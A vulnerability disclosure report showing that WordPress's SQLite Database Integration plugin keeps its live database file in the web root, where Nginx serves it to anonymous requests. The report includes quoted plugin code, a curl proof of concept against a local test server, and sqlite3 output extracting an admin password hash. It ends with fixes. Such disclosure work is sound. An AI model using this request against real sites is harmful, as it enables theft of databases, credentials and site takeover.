## TL;DR
WordPress's SQLite Database Integration plugin stores the live database file at
`wp-content/database/.ht.sqlite` — inside the web root. Its only protection is
an Apache `.htaccess` rule that Nginx silently ignores. One unauthenticated HTTP
GET returns the entire database: password hashes, session tokens, all content.
Worse, upgrading from v<3.0.0 actively strips the one protection that *did* work
on Nginx (the old `.php` extension), with no warning to the admin.

**One request. No credentials. Full database.**

## Environment
| Component | Version |
|---|---|
| WordPress | 7.1.2 |
| SQLite Database Integration | 3.0.2 (exact zip reviewed: https://downloads.wordpress.org/plugin/sqlite-database-integration.3.0.2.zip) |
| PHP | 8.4.24 (built-in dev server for the WordPress install itself; pdo_sqlite via `php8.4-sqlite3`) |
| Nginx | 1.30.1 (isolated local instance, static-file-only, serving the completed WordPress install's document root) |

Verified end-to-end against a real, freshly-installed WordPress + this plugin - not a synthetic stand-in. See "Steps to Reproduce".

## Description
The plugin stores the entire live WordPress database - a SQLite file - inside `wp-content/database/`, a path served statically by the web server in a default WordPress install. Its only access control is an Apache `.htaccess` file (`DENY FROM ALL`) plus an `index.php` stub to stop directory listing. Nginx never reads `.htaccess` files under any configuration - it is not a misconfiguration Nginx can opt into fixing, it is how Nginx works - so on any Nginx-served (or Apache-with-`AllowOverride None`-served) WordPress site, the database file is returned in full to an anonymous `GET`.
This is worse than a passive oversight: versions of this plugin before 3.0.0 named the file `.ht.sqlite.php`, which forced the web server to execute it as PHP rather than return its raw bytes - a protection that works regardless of `.htaccess` support. `db_connect()` actively **renames that file to the new, execution-less `.ht.sqlite` name** the first time an upgraded site connects, deleting the one cross-server-agnostic protection that existed.

## Root Cause
- File: `constants.php:33,49`
```php
define( 'FQDBDIR', WP_CONTENT_DIR . '/database/' );
...
define( 'FQDB', FQDBDIR . '.ht.sqlite' );
```
  The live database file's default path is `wp-content/database/.ht.sqlite` - inside the document root, with a plain (non-`.php`) extension.
- File: `wp-includes/sqlite/class-wp-sqlite-db.php:794-833` (`ensure_database_directory()`)
```php
$path = $dir . DIRECTORY_SEPARATOR . '.htaccess';
if ( ! is_file( $path ) ) {
    $result = file_put_contents( $path, 'DENY FROM ALL', LOCK_EX );
    ...
}
$path = $dir . DIRECTORY_SEPARATOR . 'index.php';
if ( ! is_file( $path ) ) {
    $result = file_put_contents( $path, '<?php // Silence is gold. ?>', LOCK_EX );
    ...
}
```
  This is the entire protection mechanism: an Apache-only access-control directive, and an empty-listing stub. Neither restricts direct-by-name file requests on Nginx.
- File: `wp-includes/sqlite/class-wp-sqlite-db.php:436-452` (`db_connect()`)
```php
if ( ! defined( 'DB_FILE' ) && ! file_exists( FQDB ) ) {
    $old_db_path = FQDBDIR . '.ht.sqlite.php';
    if ( file_exists( $old_db_path ) ) {
        if ( ! rename( $old_db_path, FQDB ) ) {
            wp_die( 'Failed to rename database file.', 'Error!' );
        }
        foreach ( array( '-wal', '-shm', '-journal' ) as $suffix ) {
            if ( file_exists( $old_db_path . $suffix ) ) {
                rename( $old_db_path . $suffix, FQDB . $suffix );
            }
        }
    }
}
```
  Runs unconditionally on every connection where `DB_FILE` isn't explicitly overridden by the site admin. Any site that ever ran a pre-3.0.0 version of this plugin gets its DB file silently stripped of PHP-execution protection on upgrade.
- Why it's wrong: there is no code path in this plugin - anywhere - that verifies the `.htaccess`/`index.php` protection is actually effective for the web server in use, and no warning is ever surfaced to the site admin (checked `admin-notices.php`, `admin-page.php`, `health-check.php` - none mention web-server type or DB-file exposure risk).

## Steps to Reproduce

1. Attacker requests the database file directly over HTTP, with no authentication:
```bash
curl -s http://127.0.0.1:18899/wp-content/database/.ht.sqlite -o downloaded.ht.sqlite -D download-headers.txt
```
Verbatim response headers:
```
HTTP/1.1 200 OK
Server: nginx/1.30.1
Date: Fri, 25 Sep 2026 11:13:13 GMT
Content-Type: text/plain
Content-Length: 356352
Last-Modified: Fri, 25 Sep 2026 11:12:30 GMT
Connection: keep-alive
ETag: "6ab6571e-57000"
Accept-Ranges: bytes
```

2. Attacker opens the downloaded file and extracts credentials - no filesystem access to the target used, only the file delivered over HTTP:
```
$ sqlite3 downloaded.ht.sqlite "SELECT ID, user_login, user_pass, user_email FROM wp_users;"
1|admin|$wp$2y$12$zC1khJHkelI0Q18ys8eBsO5D6bI9K2I5nWfAWsB/JvtGQnM9v4P3W|admin@example.test
```

3. To confirm this is the genuine, complete live database and not a partial or corrupted read, compare it against the file on disk:
```
$ sha256sum downloaded.ht.sqlite site/wp-content/database/.ht.sqlite
4473a3122566b8356e65783eb1037afda0029419ee840065b932cd3990f87aaf  downloaded.ht.sqlite
4473a3122566b8356e65783eb1037afda0029419ee840065b932cd3990f87aaf  site/wp-content/database/.ht.sqlite
```

**Zero authentication, confirmed:** step 1's request carries no cookies, no `Authorization` header, no nonce - Nginx never evaluates `.htaccess`, so the plugin's access-control mechanism is not merely bypassable, it is never consulted at all on this server. The `-wal`/`-shm`/`-journal` companion files (created at the same unprotected path whenever WAL mode or an open transaction is in play) would expose uncommitted writes the same way.

## Recommendation
Do not place the live database file under any web-servable path by default. Default `FQDBDIR` to a location outside `WP_CONTENT_DIR` (e.g. alongside `wp-config.php`, one level above the document root, consistent with where `wp-config.php` itself is conventionally kept out of the web root). If a web-servable path must remain supported for compatibility, restore and keep the `.php`-suffixed filename (`.ht.sqlite.php`) as the default so raw file bytes are never returned regardless of server type or `.htaccess` support, and add an active runtime check - e.g. an outbound self-request to the resolved `FQDB` URL during activation/health-check - that warns the admin in `wp-admin` if the database file is externally fetchable.

## Impact
On any WordPress site running this plugin behind Nginx (a very common deployment - many managed/shared WordPress hosts and most modern LEMP stacks) - or behind Apache with `AllowOverride` disabled for `wp-content` - an unauthenticated remote attacker can download the site's entire database in one request. This is equivalent to a full SQL dump: all user password hashes, all session/auth tokens stored in the DB, all private post/page content, all plugin/theme option data, and any custom table content any other plugin has stored. Combined with offline hash cracking or session-token reuse, this is a direct path to full site takeover with no interaction beyond one HTTP GET.

### **Note: This issue was reported via HackerOne and marked as a duplicate of a prior report — meaning it was already known to the maintainers at the time of submission.**
